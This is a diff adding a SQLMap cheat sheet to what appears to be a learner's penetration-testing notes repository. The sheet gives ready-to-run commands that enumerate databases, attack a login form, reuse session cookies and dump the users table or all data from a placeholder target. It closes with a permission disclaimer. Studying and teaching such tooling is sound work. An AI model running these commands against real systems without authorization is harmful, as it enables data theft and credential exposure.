@@ -114,5 +114,192 @@ grep "error" /var/log/syslog
 sha256sum suspicious_file
 ```
 
+---
+
+---
+
+# 🤖 SQLMap – Automated SQL Injection Tool
+
+SQLMap is an open-source tool used to **detect and exploit SQL Injection vulnerabilities automatically**. It is widely used in penetration testing to extract data from vulnerable databases.
+
+---
+
+## ⚙️ Basic Usage
+
+```bash
+sqlmap -u "http://target.com/page.php?id=1"
+```
+
+👉 Tests the URL for SQL Injection vulnerabilities.
+
+---
+
+## 🎯 Common Commands
+
+### Test a URL
+```bash
+sqlmap -u "http://target.com/page.php?id=1"
+```
+
+---
+
+### List Databases
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --dbs
+```
+
+---
+
+### Select Database
+```bash
+sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables
+```
+
+---
+
+### List Tables
+```bash
+sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables
+```
+
+---
+
+### List Columns
+```bash
+sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users --columns
+```
+
+---
+
+### Dump Data
+```bash
+sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users --dump
+```
+
+---
+
+## 🔐 Authentication (Login Bypass Testing)
+
+```bash
+sqlmap -u "http://target.com/login" \
+--data="username=admin&password=test" \
+--method=POST
+```
+
+---
+
+## 🍪 Using Cookies (Authenticated Testing)
+
+```bash
+sqlmap -u "http://target.com/dashboard" \
+--cookie="PHPSESSID=abcd1234"
+```
+
+---
+
+## 📡 Using Proxy (Burp Suite)
+
+```bash
+sqlmap -u "http://target.com/page.php?id=1" \
+--proxy="http://127.0.0.1:8080"
+```
+
+---
+
+## ⚡ Batch Mode (No Prompts)
+
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --batch
+```
+
+---
+
+## 🔎 Risk and Level
+
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3
+```
+
+- Level → Depth of testing (1–5)
+- Risk → Aggressiveness (1–3)
+
+---
+
+## 🧠 Advanced Usage
+
+### Identify Current Database
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --current-db
+```
+
+---
+
+### Identify Current User
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --current-user
+```
+
+---
+
+### Get DBMS Banner
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --banner
+```
+
+---
+
+### Dump All Data
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --dump-all
+```
+
+---
+
+## 🧪 Common Workflow
+
+1. Test target:
+```bash
+sqlmap -u "URL"
+```
+
+2. Enumerate databases:
+```bash
+--dbs
+```
+
+3. Select database:
+```bash
+-D dbname --tables
+```
+
+4. Extract data:
+```bash
+-T users --dump
+```
+
+---
+
+## ⚠️ Important Notes
+
+- Always verify before running aggressive scans
+- Avoid high risk levels on unstable targets
+- Understand manual SQLi before relying on automation
+
+---
+
+## 🧠 Pro Tips
+
+- Start with default scan, then increase `--level` and `--risk`
+- Use cookies for authenticated areas
+- Combine with Burp Suite for better control
+- Read output carefully — don’t blindly trust automation
+
+---
+
+## ⚠️ Disclaimer
+
+SQLMap should only be used on systems you own or have explicit permission to test.
+
+---
 
 ## ✨ This repository is continuously evolving as I learn and explore more advanced Metasploit techniques.
